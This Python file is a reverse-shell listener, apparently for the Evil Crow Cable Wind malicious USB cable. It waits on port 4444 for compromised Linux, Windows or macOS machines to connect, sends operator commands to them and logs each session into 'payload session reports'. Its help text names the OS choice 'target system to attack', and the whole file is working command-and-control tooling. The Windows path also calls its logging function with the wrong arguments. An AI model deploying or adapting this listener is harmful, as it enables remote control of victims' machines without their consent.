import socket
import threading
import sys
import signal
import argparse
import os
import shutil
import time
from pathlib import Path
from dataclasses import dataclass, field

server_socket = None
client_socket = None
running = True
session_log = None
session_start = None
session_remote = None
bytes_received = 0
bytes_sent = 0
active_connections = {}
connections_lock = threading.Lock()
finalization_failures = []
SHUTDOWN_FINALIZATION_TIMEOUT_SECONDS = 5.0

@dataclass
class SessionContext:
    session_dir: Path
    session_log: Path
    session_start: object
    session_remote: str
    recipient_os: str = "unknown"
    bytes_received: int = 0
    bytes_sent: int = 0

@dataclass
class ConnectionContext:
    client_socket: object
    session: SessionContext
    receive_thread: object = None
    finalization_lock: object = field(default_factory=threading.Lock, repr=False)
    socket_lock: object = field(default_factory=threading.Lock, repr=False)
    finalization_started: bool = False
    finalization_complete: bool = False
    summary_written: bool = False
    report_written: bool = False
    raw_log_closed: bool = False
    socket_closed: bool = False
    registry_removed: bool = False
    finalization_errors: list = field(default_factory=list, repr=False)

def register_connection(connection):
    with connections_lock:
        active_connections[id(connection)] = connection

def remove_connection(connection):
    with connections_lock:
        if connection.registry_removed:
            return
        active_connections.pop(id(connection), None)
        connection.registry_removed = True

def snapshot_connections():
    with connections_lock:
        return list(active_connections.values())

def safely_close_client_socket(connection):
    with connection.socket_lock:
        if connection.socket_closed:
            return

        try:
            connection.client_socket.shutdown(socket.SHUT_RDWR)
        except OSError:
            # Normal when the peer or another shutdown path already closed it.
            pass

        try:
            connection.client_socket.close()
        except OSError:
            pass

        connection.socket_closed = True

def close_registered_client_sockets():
    connections = snapshot_connections()
    for connection in connections:
        safely_close_client_socket(connection)
    return connections

def wait_for_recording_threads(connections, timeout_seconds=None):
    if timeout_seconds is None:
        timeout_seconds = SHUTDOWN_FINALIZATION_TIMEOUT_SECONDS

    deadline = time.monotonic() + max(0.0, timeout_seconds)
    current_thread = threading.current_thread()

    for connection in connections:
        receive_thread = connection.receive_thread
        if receive_thread is None or receive_thread is current_thread:
            continue
        if receive_thread.ident is None:
            continue

        remaining = deadline - time.monotonic()
        if remaining <= 0:
            break
        receive_thread.join(remaining)

    unfinished = []
    for connection in connections:
        receive_thread = connection.receive_thread
        if (
            receive_thread is not None
            and receive_thread is not current_thread
            and receive_thread.is_alive()
        ):
            unfinished.append(connection)

    if unfinished:
        print(
            "ERROR: Timed out waiting for recipient recording finalization: "
            + ", ".join(
                connection.session.session_remote for connection in unfinished
            ),
            file=sys.stderr,
        )

    with connections_lock:
        failures = list(finalization_failures)

    if failures:
        print(
            "ERROR: Recipient recording finalization failed: "
            + "; ".join(failures),
            file=sys.stderr,
        )

    return not unfinished and not failures

def shutdown_registered_connections(timeout_seconds=None):
    connections = close_registered_client_sockets()
    finalized = wait_for_recording_threads(connections, timeout_seconds)
    return 0 if finalized else 1

def write_session(session, direction, data):
    if session is None:
        return
    session_log = session.session_log
    from datetime import datetime
    stamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    if isinstance(data, bytes):
        text = data.decode("utf-8", errors="replace")
    else:
        text = str(data)
    with open(session_log, "a", encoding="utf-8") as f:
        for line in text.splitlines():
            f.write(f"[{stamp}] {direction}: {line}\n")

def write_session_summary(session):
    if session is None:
        return
    session_log = session.session_log
    session_start = session.session_start
    session_remote = session.session_remote
    bytes_received = session.bytes_received
    bytes_sent = session.bytes_sent

    summary_path = session_log.parent / "SESSION_SUMMARY.txt"
    from datetime import datetime
    end_time = datetime.now()

    with open(summary_path, "w", encoding="utf-8") as f:
        f.write("EVIL CROW CABLE WIND - SESSION SUMMARY\n")
        f.write("=" * 50 + "\n")
        f.write(f"Session start: {session_start or 'UNKNOWN'}\n")
        f.write(f"Session end:   {end_time}\n")
        f.write(f"Remote endpoint: {session_remote or 'UNKNOWN'}\n")
        f.write(f"Bytes received: {bytes_received}\n")
        f.write(f"Bytes sent:     {bytes_sent}\n")
        f.write(f"Recipient OS: {session.recipient_os}\n")
        f.write("=" * 50 + "\n")

    write_session(session,
        "EVENT",
        f"SESSION_SUMMARY | remote={session_remote or 'UNKNOWN'} | bytes_received={bytes_received} | bytes_sent={bytes_sent} | ended={end_time}"
    )

def write_session_report(session):
    if session is None:
        return
    session_log = session.session_log

    session_dir = session_log.parent
    summary_path = session_dir / "SESSION_SUMMARY.txt"
    received_path = session_dir / "received.log"
    report_path = session_dir / "REPORT.txt"

    with open(report_path, "w", encoding="utf-8") as report:
        report.write("EVIL CROW CABLE WIND - PAYLOAD SESSION REPORT\n")
        report.write("=" * 70 + "\n\n")

        if summary_path.exists():
            report.write("SESSION SUMMARY\n")
            report.write("-" * 70 + "\n")
            report.write(summary_path.read_text(encoding="utf-8", errors="replace"))
            report.write("\n")

        report.write("CHRONOLOGICAL SESSION LOG\n")
        report.write("-" * 70 + "\n")
        if session_log.exists():
            report.write(session_log.read_text(encoding="utf-8", errors="replace"))
        else:
            report.write("(No session log data)\n")

        report.write("\n")
        report.write("RAW DEVICE DATA\n")
        report.write("-" * 70 + "\n")
        report.write(f"Raw data file: {received_path.name}\n")
        if received_path.exists():
            raw = received_path.read_bytes()
            report.write(f"Raw data size: {len(raw)} bytes\n")
            report.write("Raw data (hex):\n")
            if raw:
                for offset in range(0, len(raw), 16):
                    chunk = raw[offset:offset + 16]
                    hex_bytes = " ".join(f"{b:02x}" for b in chunk)
                    report.write(f"{offset:08x}: {hex_bytes}\n")
            else:
                report.write("(No raw device data)\n")
        else:
            report.write("Raw data size: 0 bytes\n")

def finalize_connection(connection, log_file, chunk_number):
    session = connection.session
    errors = []

    with connection.finalization_lock:
        if connection.finalization_started:
            return
        connection.finalization_started = True

        try:
            write_session(
                session,
                "RECIPIENT",
                f"RECEIVE_LOOP_ENDED | chunks={chunk_number} | bytes_received={session.bytes_received}"
            )
        except Exception as error:
            errors.append(f"receive-loop event: {type(error).__name__}: {error}")

        if not connection.raw_log_closed:
            try:
                if log_file is not None:
                    log_file.close()
            except Exception as error:
                errors.append(f"raw-log close: {type(error).__name__}: {error}")
            finally:
                connection.raw_log_closed = True

        if not connection.summary_written:
            try:
                write_session_summary(session)
                connection.summary_written = True
            except Exception as error:
                errors.append(f"session summary: {type(error).__name__}: {error}")

        if not connection.report_written:
            try:
                write_session_report(session)
                connection.report_written = True
            except Exception as error:
                errors.append(f"session report: {type(error).__name__}: {error}")

        safely_close_client_socket(connection)
        connection.finalization_errors.extend(errors)
        connection.finalization_complete = True

    if errors:
        failure = f"{session.session_remote}: " + "; ".join(errors)
        with connections_lock:
            finalization_failures.append(failure)

    remove_connection(connection)

def signal_handler(sig, frame):
    global server_socket, client_socket, running
    print("\nInterrupt received. Closing server...")
    running = False
    if client_socket:
        try:
            client_socket.shutdown(socket.SHUT_RDWR)
        except OSError:
            # The latest client may already be closed. Full registry shutdown
            # occurs in the main server cleanup path.
            pass
    if server_socket:
        pass  # listener closes in server cleanup
    return

def handle_client_connection_linux(connection):
    global running
    client_socket = connection.client_socket
    session = connection.session
    log_path = session.session_log.parent / "received.log"
    log_file = None
    chunk_number = 0

    try:
        log_file = open(log_path, "ab", buffering=0)

        write_session(
            session,
            "RECIPIENT",
            f"RECEIVE_LOOP_STARTED | remote={session.session_remote}"
        )

        while running:
            try:
                data = client_socket.recv(4096)

                if data:
                    chunk_number += 1
                    chunk_size = len(data)
                    session.bytes_received += chunk_size

                    write_session(
                        session,
                        "RECIPIENT",
                        f"DATA_RECEIVED | chunk={chunk_number} | bytes={chunk_size} | total_bytes={session.bytes_received}"
                    )

                    log_file.write(data)

                    write_session(
                        session,
                        "RECIPIENT",
                        f"RAW_WRITE_COMPLETE | chunk={chunk_number} | bytes={chunk_size} | total_bytes={session.bytes_received}"
                    )

                    write_session(session, "DEVICE -> SERVER", data)

                if not data:
                    print("\nClient disconnected")
                    write_session(
                        session,
                        "RECIPIENT",
                        f"CLIENT_DISCONNECTED | remote={session.session_remote} | chunks={chunk_number} | bytes_received={session.bytes_received}"
                    )
                    write_session(
                        session,
                        "EVENT",
                        f"DISCONNECTED {session.session_remote} | bytes_received={session.bytes_received} | bytes_sent={session.bytes_sent}"
                    )
                    break

                try:
                    message = data.decode('utf-8')
                    write_session(
                        session,
                        "RECIPIENT",
                        f"DECODE_COMPLETE | chunk={chunk_number} | encoding=utf-8 | bytes={len(data)}"
                    )
                    if message:
                        message = message.replace('\r\n', '\n').replace('\r', '\n')
                        print(message, end='', flush=True)
                except UnicodeDecodeError:
                    write_session(
                        session,
                        "RECIPIENT",
                        f"DECODE_COMPLETE | chunk={chunk_number} | encoding=latin-1 | bytes={len(data)}"
                    )
                    print(data.decode('latin-1'), end='', flush=True)

            except Exception as error:
                if running:
                    try:
                        write_session(
                            session,
                            "RECIPIENT",
                            f"RECEIVE_ERROR | {type(error).__name__}: {error}"
                        )
                    except Exception:
                        pass
                    print(f"\nError receiving data: {error}")
                    running = False
                break
    finally:
        finalize_connection(connection, log_file, chunk_number)

def send_commands_to_client_linux(connection):
    global running
    client_socket = connection.client_socket
    session = connection.session
    while running:
        try:
            try:
                command = input()
            except EOFError:
                # No interactive terminal input; keep the connection alive.
                return

            with connection.finalization_lock:
                if not running or connection.finalization_started:
                    return

                if command.lower() in ["exit", "quit"]:
                    running = False
                    safely_close_client_socket(connection)
                    break

                if command:
                    payload = f"{command}\n".encode("utf-8")
                    write_session(session, "SERVER -> DEVICE", payload)
                    client_socket.sendall(payload)
                    session.bytes_sent += len(payload)
        except Exception as error:
            print(f"\nError sending data: {error}")
            running = False
            safely_close_client_socket(connection)
            break

def start_server_linux(host='0.0.0.0', port=4444, os_type='linux'):
    global server_socket, client_socket, running, session_log, session_start, session_remote, bytes_received, bytes_sent
    project_root = Path(__file__).resolve().parents[2]
    log_dir = Path(__file__).resolve().parents[2] / "sessions"
    log_dir.mkdir(parents=True, exist_ok=True)
    from datetime import datetime
    session_start = None
    session_remote = None
    bytes_received = 0
    bytes_sent = 0
    shutdown_status = 0

    try:
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((host, port))
        server_socket.listen(5)
        server_socket.settimeout(0.5)
        print(f"[*] Listening on {host}:{port}")

        while running:
            try:
                client_socket, client_address = server_socket.accept()
            except socket.timeout:
                continue

            session_stamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S-%f')
            session_dir = log_dir / f"session-{session_stamp}"
            session_dir.mkdir(parents=True, exist_ok=True)
            session_log = session_dir / "session.log"
            session_log.touch()

            session = SessionContext(
                session_dir=session_dir,
                session_log=session_log,
                session_start=datetime.now(),
                session_remote=f"{client_address[0]}:{client_address[1]}",
                    recipient_os=os_type
            )

            print(f"[*] Connection established with {client_address[0]}:{client_address[1]}")
            write_session(session, "EVENT", f"CONNECTED {session.session_remote}")

            connection = ConnectionContext(
                client_socket=client_socket,
                session=session,
            )
            receive_thread = threading.Thread(
                target=handle_client_connection_linux,
                args=(connection,),
            )
            send_thread = threading.Thread(
                target=send_commands_to_client_linux,
                args=(connection,),
            )
            connection.receive_thread = receive_thread

            receive_thread.daemon = True
            send_thread.daemon = True

            register_connection(connection)
            try:
                receive_thread.start()
                send_thread.start()
            except Exception:
                safely_close_client_socket(connection)
                if receive_thread.ident is None:
                    finalize_connection(connection, None, 0)
                raise

            # Keep the listener available for additional connections.
            # The per-session receive thread owns the client connection.

    except KeyboardInterrupt:
        print("\nServer stopped.")
    finally:
        running = False
        shutdown_status = shutdown_registered_connections()
        if server_socket:
            server_socket.close()
    return shutdown_status

def start_server_windows(host, port):
    global server_socket, client_socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((host, port))
    server_socket.listen(1)

    print(f"[*] Listening on {host}:{port}")

    try:
        client_socket, client_address = server_socket.accept()
        print(f"[*] Connection established with {client_address[0]}:{client_address[1]}")
        write_session("EVENT", f"CONNECTED {client_address[0]}:{client_address[1]}")

        while True:
            command = input("\nShell> ").strip()

            if command.lower() in ["exit", "quit"]:
                break

            client_socket.sendall((command + '\n').encode('utf-8'))

            response = b""
            while True:
                part = client_socket.recv(4096)
                if not part:
                    break
                response += part

                if b"END_OF_COMMAND" in response:
                    break

            final_response = response.decode('utf-8', errors='replace').strip()
            final_response = final_response.replace("END_OF_COMMAND", "")
            print_formatted_response(final_response)

    except Exception as e:
        print(f"Error: {e}")
    finally:
        if client_socket:
            client_socket.close()
        if server_socket:
            server_socket.close()

def print_formatted_response(response):
    lines = response.splitlines()
    for line in lines:
        if line.strip():
            print(line)

def main():
    parser = argparse.ArgumentParser(description="Server for shell connection.")
    parser.add_argument("--port", type=int, required=True, help="Port to listen on")
    parser.add_argument("--target", type=str, required=True, choices=["linux", "windows", "macos"], help="Target system to attack")

    args = parser.parse_args()
    port = args.port
    os_type = args.target

    signal.signal(signal.SIGINT, signal_handler)

    exit_status = 0
    if os_type == 'linux':
        exit_status = start_server_linux(port=args.port, os_type=os_type)
    elif os_type == 'windows':
        start_server_windows(host='0.0.0.0', port=args.port)
    if os_type == 'macos':
        exit_status = start_server_linux(port=args.port, os_type=os_type)
    return exit_status

if __name__ == "__main__":
    sys.exit(main())
